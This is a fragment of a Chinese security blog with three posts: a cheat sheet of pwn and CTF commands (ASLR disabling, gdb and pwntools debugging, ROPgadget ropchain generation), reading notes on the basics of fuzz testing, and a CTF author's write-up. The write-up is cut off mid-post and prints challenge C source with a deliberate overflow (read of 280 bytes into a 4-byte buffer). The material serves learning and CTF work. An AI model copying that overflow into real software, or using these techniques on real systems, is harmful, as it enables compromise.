+<li><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/Pwngdb">pwngdb</a> —— gdb for pwn</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>  —— facilitate ROP exploitation tool</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/inaz2/roputils">roputils</a> 	—— A Return-oriented Programming toolkit</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">one_gadget</a> —— A searching one-gadget of execve(‘&#x2F;bin&#x2F;sh’, NULL, NULL) tool for amd64 and i386</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/angr/angr">angr</a>   ——  A platform-agnostic binary analysis framework</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/radare/radare2">radare2</a> ——  A rewrite from scratch of radare in order to provide a set of libraries and tools to work with binary files</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a> —— Provide powerful tools for seccomp analysis</li>
+<li>linux_server[64] 	—— IDA 7.0 debug server for linux</li>
+<li><a target="_blank" rel="noopener" href="https://tmux.github.io/">tmux</a> 	—— a terminal multiplexer</li>
+<li><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/ltrace">ltrace</a>      —— trace library function call</li>
+<li><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/strace">strace</a>     —— trace system call</li>
+</ul>
+<h3 id="included-glibc"><a href="#included-glibc" class="headerlink" title="included glibc"></a>included glibc</h3><p>Default compiled glibc path is <code>/glibc</code>.</p>
+<ul>
+<li>2.19  —— ubuntu 12.04 default libc version</li>
+<li>2.23  —— ubuntu 16.04 default libc version</li>
+<li>2.24  —— introduce vtable check in file struct</li>
+<li>2.27  —— pwndocker default glibc version</li>
+<li>2.28  —— new libc version</li>
+<li>2.29  —— latest libc version</li>
+</ul>
+<h4 id="How-to-run-in-custom-libc-version"><a href="#How-to-run-in-custom-libc-version" class="headerlink" title="How to run in custom libc version?"></a>How to run in custom libc version?</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so</span><br><span class="line">patchelf --set-interpreter /tmp/ld-2.27.so ./test</span><br><span class="line">LD_PRELOAD=./libc.so.6 ./test</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">&quot;/path/to/ld.so&quot;</span>, <span class="string">&quot;./test&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/path/to/libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>strange</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space//whether open aslr or not  </span><br><span class="line">ulimit -c unlimited//指示程序每当出现错误时会生成转储文件</span><br><span class="line">echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern//save to tmp directory</span><br><span class="line">gdb $file_name core.%t//debug core file</span><br><span class="line">socat TCP4-LISTEN:8888,fork EXEC:./a.out</span><br><span class="line">nm -D some.so</span><br><span class="line">objdump -tT  some.so</span><br><span class="line">#dump出so各函数地址</span><br><span class="line">objdump -d -j .plt file_name</span><br><span class="line">#显示plt表</span><br><span class="line">objdump -R file_name</span><br><span class="line">#显示got表</span><br></pre></td></tr></table></figure>
+<p>gdb </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">p (*(struct _IO_FILE_plus *) addr)</span><br><span class="line">fpchain</span><br><span class="line">telescope addr num</span><br><span class="line">elfsymbol</span><br><span class="line">vmmap</span><br><span class="line">readelf</span><br><span class="line">find string</span><br><span class="line">record</span><br><span class="line">x/wx addr</span><br><span class="line">find addr,offset,string</span><br><span class="line">print function</span><br><span class="line">#gdb显示一些addr存放的值，炒鸡好用</span><br><span class="line">- w可换位b/h/g，分别取1/2/8字节</span><br><span class="line">- /后可以接数字，表示显示多少</span><br><span class="line">- 第二个x可以换成u（unsinged int）/d（10进制数）/s（字符串）/i（指令）</span><br><span class="line">set *addr=value</span><br><span class="line">- 设置addr值，默认为4字节</span><br><span class="line">- 也可以将*换位&#123;char/short/long&#125;分别设置1/2/8字节</span><br></pre></td></tr></table></figure>
+<p>pwntools</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">p = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;, &quot;./pwn&quot;\</span><br><span class="line">], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.23/64/lib/libc.so.6&quot;&#125;)</span><br><span class="line"></span><br><span class="line">def debug(addr,PIE=True):</span><br><span class="line">if PIE:</span><br><span class="line">    text_base = int(os.popen(&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;.format(p.pid)).readlines()[1], 16)</span><br><span class="line">    gdb.attach(p,&#x27;b *&#123;&#125;&#x27;.format(hex(text_base+addr)))</span><br><span class="line">else:</span><br><span class="line">    gdb.attach(p,&quot;b *&#123;&#125;&quot;.format(hex(addr)))</span><br></pre></td></tr></table></figure>
+<p>ROPgadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --ropchain</span><br><span class="line">ROPgadget --binary easy_pwn --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/01/2021-07-01-commands/" data-id="cuidDk-HdsYR4WwhOt4_Fqa1m" data-title="各种小命令（防遗忘" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2021-01-13-fuzz_note" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/13/2021-01-13-fuzz_note/" class="article-date">
+  <time class="dt-published" datetime="2021-01-12T16:00:00.000Z" itemprop="datePublished">2021-01-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/13/2021-01-13-fuzz_note/">Reading notes</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看完本书学到很多东西，记此笔记和大家分享；考虑到本书内容庞杂，可以大致分为三部分：前六章是基础，之后的是具体平台fuzz的具体实现方式和注意事项，第三部分归类为其他。本次笔记谈的是前六章。</p>
+<h3 id="第一章-安全漏洞发现方法学"><a href="#第一章-安全漏洞发现方法学" class="headerlink" title="第一章 安全漏洞发现方法学"></a>第一章 安全漏洞发现方法学</h3><blockquote>
+<p>三种发现漏洞的方式</p>
+</blockquote>
+<p>白盒测试、黑盒测试和灰盒测试是发现安全漏洞的三个主要方法。白盒要求测试者有被测系统的所有资源，黑盒则走向另一个极端，大部分情况属于“盲测”，灰盒在本书中讨论的方法是有编译后的二进制文件和部分基础文档。具体阐述如下：</p>
+<h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><ul>
+<li>进行代码评审（人工审计或上自动化）；</li>
+<li>优点：高覆盖（从理论上来说能发现一切漏洞）；</li>
+<li>缺点：太复杂也不太现实</li>
+</ul>
+<h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><ul>
+<li>手工测试或fuzz（引出fuzz，简单地说是把程序非预期的数据都输入给被测应用，监视返回的结果）；</li>
+<li>优点：高可用（基本总是可用）、高可重现性（例如完成对某种服务器黑盒测试可以用相同原理用到类似的服务器上）、简单（无需了解细节，但是想发现有趣的问题也要深入学习）；</li>
+<li>缺点：黑盒测试不知何时停止、不知测试的效果、不聪明比较笨</li>
+</ul>
+<h4 id="灰盒测试"><a href="#灰盒测试" class="headerlink" title="灰盒测试"></a>灰盒测试</h4><ul>
+<li>黑盒测试+逆向工程获得系统内部知识，通过反汇编器反编译器、调试器对应用进行深入剖析；</li>
+<li>优点：能拿到二进制版本的被测软件后灰盒测试就能派上用场、覆盖率较黑盒有所增加；</li>
+<li>缺点：复杂性，没有二进制成员参与逆向分析就寸步难行了</li>
+</ul>
+<p>请记住三者没有优劣之分。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180259-841f7e06-5586-1.png"></p>
+<h3 id="第二章-什么是模糊测试"><a href="#第二章-什么是模糊测试" class="headerlink" title="第二章 什么是模糊测试"></a>第二章 什么是模糊测试</h3><blockquote>
+<p>模糊测试概念</p>
+</blockquote>
+<p>学界最与之相近的术语是边界值分析，它是一种黑盒测试方法，其根据应用的合法和非法输入区间，选落在区间边界附近的值做输入。模糊测试已经和这个概念很相像，但区别是模糊测试并非仅关注边界值，还会关心任何能触发未定义或不安全行为的输入。</p>
+<p>本书中模糊测试定义为：通过向应用提供非预期输入并监控输出的一场来发现软件异常的方法。其利用自动化或半自动化重复向应用提供输入。在此给出两类用于模糊测试的模糊测试器：</p>
+<ul>
+<li>基于变异的模糊测试器（通过对已有的数据样本进行变异来创建测试用例）；</li>
+<li>基于生成的模糊测试器（为被测系统用的协议或是文件格式建模，基于模型生成输入并创建测试用例）</li>
+</ul>
+<p>作者在这用了个形象的例子，例如我们的目的是破门进入一间房子，白盒测试就是我得到了房子任何信息，甚至知道卧室锁子的结构，但我只能看，不知道我真正要破门后发生什么；采用黑盒就能在夜晚悄悄在外部测试门和窗，向房子内窥找到最好突破口；选择模糊测试的话就只需选一个武器并使破门进房间成为自动化即可。</p>
+<h4 id="模糊测试历史"><a href="#模糊测试历史" class="headerlink" title="模糊测试历史"></a>模糊测试历史</h4><ul>
+<li>1989年，Miller教授用了一种原始模糊测试器测试UNIX的鲁棒性，思路是向应用中发送随机生成的字符串和字符；</li>
+<li>1999年，Oulu大学创建PROTOS测试套件：通过分析协议规范来生成畸形的数据包；</li>
+<li>2002年，微软向PROTOS提供资金支持，以继续发展（如实现了图形用户界面）；</li>
+<li>之后又有SPIKE模糊测试器被发布，该工具实现了基于块的方法用于测试基于网络的应用程序，有描述可变长数据块的能力，其还自带一个库，包含一些可能使应用发生故障的数据；同时该工具还有一些预定义的函数可以帮助生成常见的协议数据和格式数据。该工具在当时异常强大，支持了对Sun RPC和微软 RPC两种通信技术（值得一提的是发布SPIKE前，作者Aitel还发布了一个模糊测试器，它通过修改环境变量的值来发现漏洞，其采用了用共享库来hook返回环境变量的函数，返回的变量值比之前长的多来达到溢出目的）；</li>
+<li>2004年，mangleme工具生成大量不正常的HTML文件来发现Web浏览器漏洞，等等；</li>
+<li>2004年，也是文件模糊测试兴起的一年，基于变异的模糊测试器大行其道；</li>
+<li>2005年，一款硬件模糊测试工具把模糊测试潮流推向高潮；</li>
+<li>2006年，ActiveX模糊测试开始流行；</li>
+<li>。。。</li>
+</ul>
+<h4 id="模糊测试各个阶段"><a href="#模糊测试各个阶段" class="headerlink" title="模糊测试各个阶段"></a>模糊测试各个阶段</h4><ul>
+<li>确定测试目标</li>
+<li>确定潜在的模糊测试变量</li>
+<li>生成模糊测试数据</li>
+<li>执行！！！</li>
+<li>监视异常</li>
+<li>判断发现的洞是否能利用</li>
+</ul>
+<h4 id="目前存在的缺点"><a href="#目前存在的缺点" class="headerlink" title="目前存在的缺点"></a>目前存在的缺点</h4><ul>
+<li>模糊测试器面对例如逻辑问题，设计问题这种层面更高的时候表现不佳；</li>
+<li>不认识后门，因为模糊测试器觉得它和正常逻辑差不多；</li>
+<li>内存被破坏后如果被测应用掩盖住模糊测试器就又不懂了；</li>
+<li>测出有调用链的漏洞更加困难（人发现都困难更别说fuzz了）</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180329-9607fa6c-5586-1.png"></p>
+<h3 id="第三章-模糊测试方法与模糊测试器类型"><a href="#第三章-模糊测试方法与模糊测试器类型" class="headerlink" title="第三章 模糊测试方法与模糊测试器类型"></a>第三章 模糊测试方法与模糊测试器类型</h3><h4 id="模糊测试方法"><a href="#模糊测试方法" class="headerlink" title="模糊测试方法"></a>模糊测试方法</h4><ul>
+<li>预生成测试用例（使用框架生成的测试列表，但用完了测试就结束了）；</li>
+<li>随机生成输入（效率低，但一些写的特别特别糟糕的代码仍会中招，但是找有效的测试值很困难）；</li>
+<li>手工协议变异测试（这时候人就是模糊测试器，输入不正确的数据使服务器崩，Sql注入是很好的例子）；</li>
+<li>变异或强制性测试（打乱有效样本的数据格式来实现自动化）；</li>
+<li>自动协议生成测试（分析应用，通过了解协议或文件定义的文法来生成模板，达到fuzz的目的，相当高级）</li>
+</ul>
+<h4 id="模糊测试器类型"><a href="#模糊测试器类型" class="headerlink" title="模糊测试器类型"></a>模糊测试器类型</h4><ul>
+<li>本地模糊器(对本地应用的fuzz：有命令行直接fuzz，带有环境变量的fuzz，还有文件格式的fuzz)；</li>
+<li>远程模糊测试器（对在网络上打开端口的应用进行fuzz：有网络协议模糊测试器和对Web应用的模糊测试器）；</li>
+<li>内存模糊测试器：对进程拍快照，然后注入故障数据，测试完后恢复再重复注入；这种方法最大的优点就是如果协议进行了加密、校验或压缩算法，该测试器可以在上述算法完成后创建快照；然而缺点也存在，如有可能数据根本无法通过输入源输入，测试者想当然的注入进来就显得毫无意义，同时异常对应到输入源也很难确定；</li>
+<li>模糊测试框架：即一个通用的框架，包含一个库生成测试字符串，此外还应包括类似脚本的语言，用来创建特定模糊测试器</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180355-a5633396-5586-1.png"></p>
+<h3 id="第四章-数据表示和分析"><a href="#第四章-数据表示和分析" class="headerlink" title="第四章 数据表示和分析"></a>第四章 数据表示和分析</h3><h4 id="什么是协议"><a href="#什么是协议" class="headerlink" title="什么是协议"></a>什么是协议</h4><p>协议在维基百科中被定义为在两台计算机端点间控制或使能连接，通信和数据传输的约定或标准。计算机间的通信也依赖于此，同时协议也有不同表现形式，比如便于人工阅读，有的人肉眼根本看不懂。协议中包含的各个部分被称为字段。</p>
+<h4 id="协议中的字段"><a href="#协议中的字段" class="headerlink" title="协议中的字段"></a>协议中的字段</h4><ul>
+<li>变长字段（不为每个数据元素设定固定的长度对完全结构化、复杂的数据，最好用可变长字段，来提供灵活性）</li>
+<li>定长字段（将每个字段长度设为固定值，最好的例子：TCP、UDP）</li>
+<li>分隔字段（如简单文本协议用回车做分隔符）</li>
+</ul>
+<h4 id="常用协议元素"><a href="#常用协议元素" class="headerlink" title="常用协议元素"></a>常用协议元素</h4><p>这块需要划重点，对此越了解，就月能够在fuzz中关注那些易于引发异常协议中的部分</p>
+<ul>
+<li>名字-值对（如size&#x3D;12，对值进行模糊可能会有奇效）</li>
+<li>块标识符（用来标识二进制数据块的数据类型，文档中没有记录的块标识符很有可能接受额外的数据类型，意思就是捡漏）</li>
+<li>块大小（通过修改块大小的值有可能能实现缓冲区溢出或下溢）</li>
+<li>校验和（如果进行fuzz时破坏数据，却不修改校验和必然会影响读取应用，所以必须考虑）</li>
+</ul>
+<p>可见对协议有一个好的理解会使得前期的工作事半功倍</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180415-b13df4c6-5586-1.png"></p>
+<h3 id="第五章-有效模糊测试的需求"><a href="#第五章-有效模糊测试的需求" class="headerlink" title="第五章 有效模糊测试的需求"></a>第五章 有效模糊测试的需求</h3><h4 id="几个需求如下："><a href="#几个需求如下：" class="headerlink" title="几个需求如下："></a>几个需求如下：</h4><ul>
+<li>可重现性：在每次运行时的被测应用行为应毫无二致，计算机没有绝对的随机；</li>
+<li>文档：虽然不是必须的，但尽可能多的信息打包成清晰准确的形式绝对有利于分析和复现；</li>
+<li>可重用：程序员不可能每fuzz一次就重写一个工具，复用组件是个好主意；</li>
+<li>过程状态和过程深度：此概念可以理解为从家走到公司，走的每一步都是一次状态。过程状态就是目标进程在任意给定时刻所处的具体状态：如走了1步和走了10步，而过程深度时为了达到某特定状态所需要前进的步数的度量，我们走到公司旁的红绿灯和刚出门绝对不一样。这时要引出逻辑分离概念，概念就像出门走路的方向一样，往左走和右走可能会导致完全不同的fuzz结果；</li>
+<li>代码覆盖：描述程式中源代码被测试的比例和程度，所得比例称为代码覆盖率。但是在作者写书时还没有哪项fuzz技术能够记录该指标；</li>
+<li>错误检测：fuzz是“盲目的”，它们不知道被测应用对自己的反应，只能通过一些很“粗”的方式检查，例如程序是否被跑崩，能否ping通等，所以下一代有了调试客户端，进一步展望有可能二进制插装&#x2F;翻译平台，该平台很底层，能有针对性的对被测目标进行分析插装；</li>
+<li>资源约束：简单来说就是fuzz时候现实点（考虑周全）</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180427-b89fee9a-5586-1.png"></p>
+<h3 id="第六章-自动化与数据生成"><a href="#第六章-自动化与数据生成" class="headerlink" title="第六章 自动化与数据生成"></a>第六章 自动化与数据生成</h3><p>本章作者归到了“目标与自动化中”模块中，但感觉可以合并到基础中</p>
+<h4 id="自动化价值"><a href="#自动化价值" class="headerlink" title="自动化价值"></a>自动化价值</h4><ul>
+<li>程序员相较于之前的时间价值被提高</li>
+<li>fuzz什么人都能做（啊这）</li>
+<li>同样的测试用例可能对不同服务器都产生效果</li>
+</ul>
+<h4 id="有用的工具和库"><a href="#有用的工具和库" class="headerlink" title="有用的工具和库"></a>有用的工具和库</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.wireshark.org/">Wireshark · Go Deep.</a></li>
+<li><a target="_blank" rel="noopener" href="http://bastard.sourceforge.net/libdisasm.html">libdisasm: x86 disassembler library (sourceforge.net)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/jtpereyda/libdasm/blob/master/README.txt">libdasm&#x2F;README.txt at master · jtpereyda&#x2F;libdasm (github.com)</a></li>
+<li><a target="_blank" rel="noopener" href="http://libnet.sourceforge.net/libnet.html">Libnet Documentation (sourceforge.net)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.tcpdump.org/">TCPDUMP&#x2F;LIBPCAP public repository</a></li>
+<li><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/dotmetro/">metro packet library download | SourceForge.net</a></li>
+<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/ptrace.2.html">ptrace(2) - Linux manual page (man7.org)</a></li>
+<li>python 扩展：如Pcapy，Scapy和PyDbg</li>
+</ul>
+<h4 id="数据生成与模糊试探值"><a href="#数据生成与模糊试探值" class="headerlink" title="数据生成与模糊试探值"></a>数据生成与模糊试探值</h4><p>因为不可能穷举所有输入，所以输入用例必须有所突出</p>
+<ul>
+<li>整数值：如0和0xFFFFFFFF，甚至0xFFFFFFFF-1、0xFFFFFFFF-2等对它的加减倍乘运算；</li>
+<li>字符串重复：一堆“A”可能就会发生各种事；</li>
+<li>字段分隔符：例如有时候分隔符起一个标志作用，程序扫不到会一直累加计数器进而引发溢出；</li>
+<li>格式化字符串：这个就很严重了而且发现及其简单；</li>
+<li>字符翻译：不合适的字符转换可能引发不正确的结果；</li>
+<li>目录遍历：目录遍历修饰符也要被考虑；</li>
+<li>命令注入：有时候我们的输入经过我们的构造可能会被执行，所以命令注入也得摆在突出位置</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180443-c1fcd232-5586-1.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/13/2021-01-13-fuzz_note/" data-id="cuidNTzpM4eKOZ7w5xEuYir7x" data-title="Reading notes" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2020-09-24-Lua_magic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/09/24/2020-09-24-Lua_magic/" class="article-date">
+  <time class="dt-published" datetime="2020-09-23T16:00:00.000Z" itemprop="datePublished">2020-09-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/09/24/2020-09-24-Lua_magic/">An interacting pwn</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间打了国赛，出了道bulid的pwn题，用到了几个杂而有趣的知识点，玩起来不太常规，做起来甚至可以说是有点难受，在此记录一下。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pic4xiu/C/blob/master/%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5/pwn/bin.zip">题目链接</a></p>
+<p>文末也有链接</p>
+<h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><p>最近学了学安卓，想到了一个之前分析过的mobile案例，一个apk通过调用lua实现函数的重写（就是之前血洗高校的一个apk），觉得很好玩，决定应用到题目里边。</p>
+<p>文件结构：一个二进制文件，一个加密过的Lua文件，一个flag文件。</p>
+<p>程序流程：</p>
+<ul>
+<li>二进制程序部署在特定端口，使用nc访问</li>
+<li>程序起来后会加载加密过的lua文件到内存，之后程序在内存中解密lua程序，在程序中输入字符，将字符交给lua进行处理，必须满足某种关系程序才能向下进行。</li>
+<li>完成绕过后选择了缓冲区溢出，文件没关canary，用ssp leak可以直接把flag读出来。整体看下来就是一个披着pwn题外衣的C加lua程序逆向题。</li>
+<li>因为用到了好多C语言lua库函数的好多函数，用ida分析程序会发现非常恶心，得仔细扣，之前没接触过这种的还得现学。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/lua/lua-environment.html">环境搭建</a></p>
+<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><blockquote>
+<p>写的时候现学现卖，请师傅们指教</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;lua5.1/lua.h&gt;</span><br><span class="line">#include &lt;lua5.1/lualib.h&gt;</span><br><span class="line">#include &lt;lua5.1/lauxlib.h&gt;</span><br><span class="line">char flag[0x20];</span><br><span class="line">char* c;</span><br><span class="line">uint8_t *enc(uint8_t *data, int size) &#123;//加密函数，和解密函数完全一致</span><br><span class="line">	uint8_t *temp = (uint8_t *)malloc(size);</span><br><span class="line">	int k[3]=&#123;2,3,5&#125;;</span><br><span class="line">	int i;</span><br><span class="line">	if (size) &#123;</span><br><span class="line">		for (i = 0; i &lt; size; i++) &#123;</span><br><span class="line">			temp[i] = data[i]^k[i%3];</span><br><span class="line">		&#125;</span><br><span class="line">	return temp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	setvbuf(stdout,0,2,0);</span><br><span class="line">	FILE *f = fopen(&quot;main.lua&quot;, &quot;rb&quot;);//读入同目录加密过的lua文件</span><br><span class="line">	if (f == NULL)</span><br><span class="line">		return -1;</span><br><span class="line">	fseek(f, 0, SEEK_END);</span><br><span class="line">	long file_size = ftell(f);</span><br><span class="line">	uint8_t *buf = (uint8_t *)malloc(file_size);</span><br><span class="line">	rewind(f);</span><br><span class="line">	fread(buf, sizeof(char), file_size, f);</span><br><span class="line">	uint8_t *rea = enc(buf,file_size);</span><br><span class="line">	lua_State *luaEnv = lua_open();//创建一个新的lua_State</span><br><span class="line">	luaopen_base(luaEnv);</span><br><span class="line">	luaL_openlibs(luaEnv);</span><br><span class="line">	if(!luaEnv)</span><br><span class="line">	&#123;</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	int loadInfo = luaL_loadstring(luaEnv,rea);//以字符串形式把解密过的lua语句load进去</span><br><span class="line">	if(loadInfo)</span><br><span class="line">	&#123;</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	int i,j,a,k=3;</span><br><span class="line">	puts(&quot;Hello I&#x27;m lua.\nLet&#x27;s experience something different&quot;);</span><br><span class="line">	while(k)&#123;</span><br><span class="line">		puts(&quot;Enter two numbers in your heart;)&quot;);</span><br><span class="line">		scanf(&quot;%d&quot;,&amp;i);</span><br><span class="line">		scanf(&quot;%d&quot;,&amp;j);</span><br><span class="line">		lua_pcall(luaEnv,0,0,0);</span><br><span class="line">		lua_getglobal(luaEnv,&quot;hndl&quot;);//找这个名字的函数</span><br><span class="line">		lua_pushnumber(luaEnv,i);//以堆栈形式传参</span><br><span class="line">		lua_pushnumber(luaEnv,j);</span><br><span class="line">		puts(&quot;mamimami hon~~~~&quot;);</span><br><span class="line">		lua_pcall(luaEnv,2,1,0);//完成调用，之后的参数分别是参数个数、返回值个数和错误处理函数（0表示无）</span><br><span class="line">		a=lua_tonumber(luaEnv,-1);//同样以堆栈方式取值</span><br><span class="line">		puts(&quot;who am I?&quot;);</span><br><span class="line">		sleep(1);</span><br><span class="line">		printf(&quot;%d!!\n&quot;,a);</span><br><span class="line">		if(a==random())//和伪加密数进行比较</span><br><span class="line">			k--;//重复次数</span><br><span class="line">		else</span><br><span class="line">		&#123;	puts(&quot;Your ideas are different from Lua&#x27;s :( sry&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	char b[4];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp = fopen(&quot;flag&quot;,&quot;r&quot;);</span><br><span class="line">	fread(flag,1,0x20,fp);</span><br><span class="line">	puts(&quot;All right,the magic failed&quot;);</span><br><span class="line">	read(0,b,280);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">//gcc -o Lua_magic te.c -llua5.1</span><br></pre></td></tr></table></figure>
+
+<p>看下lua加密前的源码</p>
